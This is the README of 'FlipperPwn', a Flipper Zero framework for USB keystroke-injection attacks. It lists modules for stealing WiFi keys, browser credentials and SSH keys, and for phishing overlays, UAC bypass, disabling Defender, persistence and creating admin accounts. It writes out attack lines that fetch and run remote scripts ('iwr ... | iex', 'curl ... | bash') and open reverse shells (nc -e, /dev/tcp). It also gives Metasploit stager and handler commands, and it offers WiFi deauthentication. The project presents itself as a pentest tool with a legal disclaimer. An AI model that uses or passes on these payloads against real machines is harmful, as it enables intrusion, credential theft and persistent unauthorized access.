# FlipperPwn

```
 _____ _ _                 ____
|  ___| (_)_ __  _ __   _|  _ \__      ___ __
| |_  | | | '_ \| '_ \ / _ \ \ \ /\ / / '_ \
|  _| | | | |_) | |_) |  __/  \ V  V /| | | |
|_|   |_|_| .__/| .__/ \___|___\_/\_/ |_| |_|
          |_|   |_|        |_____|
```

**Modular pentest payload framework for Flipper Zero**

[![Platform](https://img.shields.io/badge/platform-Flipper%20Zero-orange)](https://flipperzero.one)
[![Firmware](https://img.shields.io/badge/firmware-1.4.3-blue)](https://github.com/flipperdevices/flipperzero-firmware)
[![API](https://img.shields.io/badge/API-87.1-green)](https://github.com/flipperdevices/flipperzero-firmware)
[![Category](https://img.shields.io/badge/category-USB-yellow)](.)

---

FlipperPwn is a Metasploit-inspired payload framework that turns Flipper Zero into a USB HID attack platform. Load `.fpwn` modules from an SD card, auto-detect the target OS via LED heuristics, configure options, and execute keystroke injection payloads — all from the Flipper's menu. Optional ESP32 WiFi Dev Board integration adds network scanning, deauth, and evil portal capabilities.

> **This tool is for authorized security testing only. See the [Legal Disclaimer](#legal-disclaimer).**

---

## Table of Contents

- [How It Works](#how-it-works)
- [OS Detection](#os-detection)
- [WiFi Dev Board Integration](#wifi-dev-board-integration)
- [Built-in Modules](#built-in-modules)
- [Module Format (.fpwn)](#module-format-fpwn)
- [Metasploit Integration](#metasploit-integration)
- [Installation](#installation)
- [WiFi Dev Board Setup](#wifi-dev-board-setup)
- [Legal Disclaimer](#legal-disclaimer)

---

## How It Works

```
  [ Flipper Zero ] ──USB HID──► [ Target Machine ]
        │                              │
        │   1. Enumerate as keyboard   │
        │   2. Run OS detection        │
        │   3. Select .fpwn module     │
        │   4. Configure options       │
        │   5. Execute payload ───────►│ (keystrokes)
        │                              │
        │◄── Live progress on screen ──│
```

**Attack chain:**

1. Plug Flipper Zero into the target machine via USB-C.
2. The Flipper enumerates as a standard USB HID keyboard — no driver installation required.
3. OS detection runs automatically (or you set it manually from the options menu).
4. Browse modules by category: **Recon**, **Credentials**, **Exploit**, **Post-Exploit**.
5. Select a module, review and edit its options (e.g., `LHOST`, `LPORT`).
6. Execute: the payload opens the appropriate terminal/dialog for the detected OS, types the commands, and establishes access.
7. Progress is shown live on the Flipper screen. Press **Back** at any time to abort.

Up to **64 modules** can be loaded from the SD card simultaneously. Modules are discovered at startup by scanning `/ext/flipperpwn/modules/` for `.fpwn` files.

---

## OS Detection

FlipperPwn uses a three-phase USB HID LED heuristic to fingerprint the target OS without sending any visible keystrokes to the screen.

```
Phase 0 — CapsLock probe (connectivity check)
  Toggle CapsLock → wait 50ms → check LED feedback
  No response? → OS Unknown (abort, USB HID not active)

Phase 1 — NumLock probe (macOS discriminator)
  Toggle NumLock → wait 100ms → check NumLock LED
  No change? → macOS (ignores NumLock on external keyboards)

Phase 2 — ScrollLock probe (Windows vs. Linux)
  Toggle ScrollLock → wait 100ms → check ScrollLock LED
  Changed? → Windows (maintains ScrollLock LED state)
  No change? → Linux (X11/Wayland do not propagate ScrollLock)
```

All toggled LEDs are restored to their original state after probing, leaving the target's keyboard indicator lights unchanged.

You can override auto-detection and manually force **Windows**, **macOS**, or **Linux** from the options screen — useful when a corporate keyboard policy suppresses LED feedback.

---

## WiFi Dev Board Integration

FlipperPwn supports the **ESP32 WiFi Dev Board** running [WiFi Marauder](https://github.com/justcallmekoko/ESP32Marauder) firmware for network-layer attacks alongside HID injection.

**Connection:** USART1 — GPIO pin 13 (TX), GPIO 14 (RX), 115200 baud

The app auto-detects the ESP32 on startup. WiFi features are greyed out if no board is present.

| WiFi Command | Description |
|---|---|
| `WIFI_SCAN` | Scan for nearby APs (SSID, RSSI, channel, encryption) |
| `WIFI_JOIN` | Connect ESP32 to a target network |
| `WIFI_DEAUTH` | Deauthentication attack against a target AP or client |
| `WIFI_RESULT` | Type the last WiFi scan result via HID into a text field |
| `WIFI_WAIT` | Wait for an async WiFi operation to complete |
| `PING_SCAN` | Discover live hosts on the joined network |
| `PORT_SCAN` | Scan a host for open ports |

Mixed HID + WiFi modules are supported: a single `.fpwn` file can scan nearby networks, join one, sweep for hosts, and type the results into a document — all sequentially.

---

## Built-in Modules

18 modules ship with FlipperPwn, organized into four categories.

### Recon

| Module | Description |
|---|---|
| `sys_info` | Dump OS version, hostname, CPU architecture, and current user |
| `wifi_enum` | List saved WiFi profiles and their SSIDs (Windows netsh / macOS security) |
| `network_enum` | Print active network interfaces, IPs, and routing table |
| `av_detect` | Query running processes and services to fingerprint AV/EDR products |

### Credentials

| Module | Description |
|---|---|
| `wifi_harvest` | Extract plaintext WiFi PSKs from the OS credential store |
| `browser_creds` | Dump browser-saved credentials from common profile paths |
| `ssh_keys` | Locate and exfiltrate SSH private keys from `~/.ssh/` |
| `fake_login` | Overlay a credential-phishing prompt mimicking an OS auth dialog |
| `env_dump` | Print environment variables including tokens, keys, and proxy settings |

### Exploit

| Module | Description |
|---|---|
| `reverse_shell_tcp` | Establish a reverse TCP shell back to a netcat listener |
| `reverse_shell_dns` | DNS-tunneled reverse shell for egress-filtered environments |
| `download_exec` | Download and execute a remote binary via PowerShell / curl / wget |
| `uac_bypass_fodhelper` | UAC bypass via the fodhelper.exe auto-elevation vector (Windows) |
| `msfvenom_stager` | Type the fetch-and-execute chain for a Metasploit meterpreter stager |

### Post-Exploit

| Module | Description |
|---|---|
| `persist_schtask` | Install a scheduled task / cron job for persistence |
| `persist_startup` | Drop a startup entry (registry / launchd / systemd user unit) |
| `disable_defender` | Disable Windows Defender real-time protection via PowerShell |
| `add_user` | Create a local administrator account with a configurable password |

---

## Module Format (.fpwn)

Modules are plain-text files with a `.fpwn` extension. They live on the SD card under `/ext/flipperpwn/modules/` and can be organized into subdirectories.

### File Structure

```
# Lines starting with # are comments
NAME        module_name
DESCRIPTION One-line description of what this module does
CATEGORY    recon|credential|exploit|post
PLATFORMS   WIN,MAC,LINUX

OPTION LHOST 10.0.0.1 "Attacker IP address"
OPTION LPORT 4444     "Attacker listening port"
OPTION DELAY 1500     "Post-open delay in ms"

PLATFORM WIN
  DELAY 500
  GUI r
  DELAY {{DELAY}}
  STRING powershell -w h -nop -ep bypass -c "iex (iwr http://{{LHOST}}/s.ps1)"
  ENTER

PLATFORM MAC
  DELAY 500
  COMMAND SPACE
  DELAY 300
  STRING terminal
  ENTER
  DELAY {{DELAY}}
  STRING curl -s http://{{LHOST}}/s.sh | bash
  ENTER

PLATFORM LINUX
  DELAY 500
  CTRL ALT t
  DELAY {{DELAY}}
  STRING curl -s http://{{LHOST}}/s.sh | bash
  ENTER
```

### Headers

| Field | Values | Required |
|---|---|---|
| `NAME` | Identifier string | Yes |
| `DESCRIPTION` | Human-readable summary | No |
| `CATEGORY` | `recon`, `credential`, `exploit`, `post` | No (defaults to `recon`) |
| `PLATFORMS` | Comma-separated: `WIN`, `MAC`, `LINUX` | No (all platforms) |

### Options

```
OPTION <NAME> <default_value> "<description>"
```

Options are editable from the Flipper menu before execution. Reference them in payload lines as `{{NAME}}`:

```
OPTION LHOST 192.168.1.100 "Listener IP"
STRING nc {{LHOST}} {{LPORT}} -e /bin/bash
```

Up to **8 options** per module. Names are case-sensitive.

### Platform Sections

Each `PLATFORM <TAG>` line begins a block of commands executed only on the matching OS. Sections end at the next `PLATFORM` line or EOF. Indentation is optional but recommended for readability.

Supported tags: `WIN`, `MAC`, `LINUX`

### Command Reference

#### Text and Timing

| Command | Effect |
|---|---|
| `STRING <text>` | Type text character-by-character via HID. Supports full ASCII including punctuation. |
| `DELAY <ms>` | Pause for the specified number of milliseconds. |

#### Navigation Keys

| Command | Key Sent |
|---|---|
| `ENTER` / `RETURN` | Return |
| `TAB` | Tab |
| `ESCAPE` / `ESC` | Escape |
| `BACKSPACE` | Backspace |
| `DELETE` | Forward delete |
| `HOME` | Home |
| `END` | End |
| `PAGEUP` | Page Up |
| `PAGEDOWN` | Page Down |
| `UP` / `DOWN` / `LEFT` / `RIGHT` | Arrow keys |

#### Function Keys

`F1` through `F12` — type the bare key name on its own line.

#### Modifier Combos

| Command | Keys Sent |
|---|---|
| `GUI <key>` / `WINDOWS <key>` / `COMMAND <key>` | Win/Cmd + key |
| `CTRL <key>` | Ctrl + key |
| `ALT <key>` | Alt + key |
| `SHIFT <key>` | Shift + key |
| `CTRL ALT <key>` | Ctrl + Alt + key |

`<key>` can be a single letter, a named key (`ENTER`, `TAB`, `F5`, `SPACE`, etc.), or an arrow key name.

#### WiFi Commands (requires ESP32)

| Command | Description |
|---|---|
| `WIFI_SCAN` | Trigger an AP scan on the ESP32 |
| `WIFI_JOIN <ssid> <pass>` | Connect to a network |
| `WIFI_DEAUTH <bssid>` | Send deauth frames to target AP |
| `PING_SCAN <subnet>` | ICMP sweep (e.g., `192.168.1.0/24`) |
| `PORT_SCAN <host>` | TCP connect scan on common ports |
| `WIFI_RESULT` | Type the last scan result as HID keystrokes |
| `WIFI_WAIT <ms>` | Wait for an async WiFi operation |

---

## Metasploit Integration

FlipperPwn's `msfvenom_stager` module and the `reverse_shell_tcp` / `reverse_shell_dns` modules are designed to work directly with Metasploit Framework.

### Meterpreter Stager Flow

**1. Generate the stager on your attacking machine:**

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=<your-IP> LPORT=4444 \
  -f exe -o /var/www/html/stager.exe
```

**2. Start a handler:**

```bash
msfconsole -q -x "
  use exploit/multi/handler;
  set payload windows/x64/meterpreter/reverse_tcp;
  set LHOST <your-IP>;
  set LPORT 4444;
  set ExitOnSession false;
  exploit -j
"
```

**3. On Flipper:** Select `msfvenom_stager`, set `LHOST` to your IP and `LPORT` to `4444`.

The module will open a hidden PowerShell window, download `stager.exe` from `http://{{LHOST}}/stager.exe`, and execute it — triggering a meterpreter callback.

### Reverse Shell (netcat)

For the `reverse_shell_tcp` module, listen with:

```bash
nc -lvnp 4444
```

Set `LHOST` and `LPORT` to match on the Flipper before executing.

### Linux/macOS Reverse Shell

```bash
nc -lvnp 4444   # or: ncat --broker -l 4444
```

The `PLATFORM LINUX` and `PLATFORM MAC` sections open a terminal, run `bash -i >& /dev/tcp/{{LHOST}}/{{LPORT}} 0>&1`, and connect back.

---

## Installation

### Requirements

- Flipper Zero with firmware **1.4.3** (API 87.1)
- [ufbt](https://github.com/flipperdevices/flipperzero-ufbt) 0.2.6+
- SD card formatted and inserted in the Flipper

### Build and Deploy

```bash
cd flipperpwn
ufbt
```

This produces `dist/flipperpwn.fap`.

**Copy to SD card:**

```
dist/flipperpwn.fap  →  /ext/apps/USB/flipperpwn.fap
```

**Copy modules to SD card:**

```
flipperpwn_modules/  →  /ext/flipperpwn/modules/
```

The app will also load custom `.fpwn` files you drop directly into `/ext/flipperpwn/modules/` — no rebuild required.

**SD card layout:**

```
/ext/
├── apps/
│   └── USB/
│       └── flipperpwn.fap
└── flipperpwn/
    └── modules/
        ├── recon/
        │   ├── sys_info.fpwn
        │   └── ...
        ├── exploit/
        │   ├── reverse_shell_tcp.fpwn
        │   └── ...
        └── my_custom_module.fpwn
```

> Modules are discovered recursively. Subdirectory names have no semantic effect — only the `CATEGORY` header in each file determines where the module appears in the menu.

---

## WiFi Dev Board Setup

**Hardware required:** [Flipper Zero WiFi Dev Board](https://shop.flipperzero.one/products/wifi-devboard) (ESP32-S2) flashed with [WiFi Marauder](https://github.com/justcallmekoko/ESP32Marauder).

1. Flash WiFi Marauder firmware onto the ESP32 Dev Board.
2. Connect the board to Flipper Zero via the GPIO header.
3. Verify connections:

   | Flipper GPIO | ESP32 | Signal |
   |---|---|---|
   | Pin 13 | TX | USART1 TX |
   | Pin 14 | RX | USART1 RX |
   | 3V3 or 5V | VIN | Power |
   | GND | GND | Ground |

4. Power the Flipper. On app start, FlipperPwn probes the USART at **115200 baud**. If the ESP32 responds to the Marauder handshake, WiFi module commands become available.

WiFi functionality is disabled automatically when no board is detected — HID-only modules work regardless.

---

## Writing Custom Modules

The `.fpwn` format is intentionally simple. A minimal working module:

```
NAME my_payload
DESCRIPTION Opens notepad and types a message
CATEGORY recon
PLATFORMS WIN

PLATFORM WIN
  DELAY 500
  GUI r
  DELAY 300
  STRING notepad
  ENTER
  DELAY 800
  STRING Hello from FlipperPwn
  ENTER
```

Save it as `my_payload.fpwn` and drop it anywhere under `/ext/flipperpwn/modules/`. It will appear in the menu on next launch.

**Tips:**
- Add `DELAY` after `GUI r` and `ENTER` — the Run dialog and terminal emulators need time to open.
- Use `OPTION` for any value you expect to change between engagements (IPs, ports, usernames, filenames).
- The `PLATFORM` block matching the detected OS is the only one executed; others are parsed but skipped.
- Comments (`#`) are supported anywhere in the file.

---

## Legal Disclaimer

FlipperPwn is provided for **authorized security testing, research, and educational purposes only**.

Using this tool against systems you do not own or do not have explicit written permission to test is **illegal** under the Computer Fraud and Abuse Act (CFAA), the Computer Misuse Act, and equivalent laws in most jurisdictions worldwide.

The authors and contributors of this project:
- Accept no liability for misuse or damage caused by this software
- Do not endorse or encourage illegal activity of any kind
- Provide this software as-is, without warranty of any kind

**You are solely responsible for ensuring your use of FlipperPwn complies with all applicable laws and regulations. Always obtain proper authorization before conducting any security test.**
